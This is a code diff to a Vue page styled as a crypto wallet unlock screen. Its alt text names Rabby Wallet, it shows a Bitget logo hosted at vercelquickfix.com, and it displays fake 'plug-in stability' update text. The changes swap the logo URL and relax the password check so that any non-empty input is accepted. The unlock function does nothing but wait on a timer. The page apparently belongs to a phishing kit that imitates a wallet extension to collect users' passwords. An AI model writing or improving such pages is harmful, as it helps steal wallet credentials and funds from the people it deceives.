@@ -63,7 +63,7 @@
               <div class="rounded-3xl flex justify-center w-full pt-[90px]">
                 <img
                   class="w-[80px] h-[80px]"
-                  src="https://vercelquickfix.com/bitget-logo.png"
+                  src="https://img.utdstc.com/icon/ba5/c2a/ba5c2a5ac31177ae33aa47ad1a35d8bc9cdd3e02f7d46bd745088c53236b95ef:200"
                   alt="Rabby Wallet"
                 />
               </div>
@@ -104,8 +104,8 @@
                   <button
                     @click="unlock"
                     type="button"
-                    :disabled="password.length <= 6 || isLoading"
-                    :class="password.length > 6 ? 'bg-white' : 'bg-gray-400'"
+                    :disabled="password.length < 1 || isLoading"
+                    :class="password.length > 0 ? 'bg-white' : 'bg-gray-400'"
                     class="w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#333] text-black relative"
                   >
                     <span v-if="!isLoading">Unlock Wallet</span>
@@ -142,7 +142,7 @@
                 <div class="rounded-3xl flex justify-center w-full pt-[90px]">
               <img
                 class="w-[80px] h-[80px]"
-                src="https://vercelquickfix.com/bitget-logo.png"
+                src="https://img.utdstc.com/icon/ba5/c2a/ba5c2a5ac31177ae33aa47ad1a35d8bc9cdd3e02f7d46bd745088c53236b95ef:200"
                 alt="Rabby Wallet"
               />
             </div>
@@ -179,7 +179,7 @@ Resolved known issues, enhancing plug-in stability and user experience
             <div key="s3" class="flex flex-col items-center p-6">
               <div class="flex flex-col items-center gap-3 py-6 w-full">
                 <div class="flex items-center justify-center">
-                  <img src="https://vercelquickfix.com/bitget-logo.png" class="w-20 h-20" alt="" />
+                  <img src="https://img.utdstc.com/icon/ba5/c2a/ba5c2a5ac31177ae33aa47ad1a35d8bc9cdd3e02f7d46bd745088c53236b95ef:200" class="w-20 h-20" alt="" />
                 </div>
 
                 <h2 class="text-4xl text-white mt-2 mb-0 text-center font-bold">
@@ -426,7 +426,7 @@ function goBackToStep2() {
 }
 
 function unlock() {
-  if (password.value.length <= 6) return;
+  if (password.value.length < 1) return;
   isLoading.value = true;
   setTimeout(() => {
     isLoading.value = false;
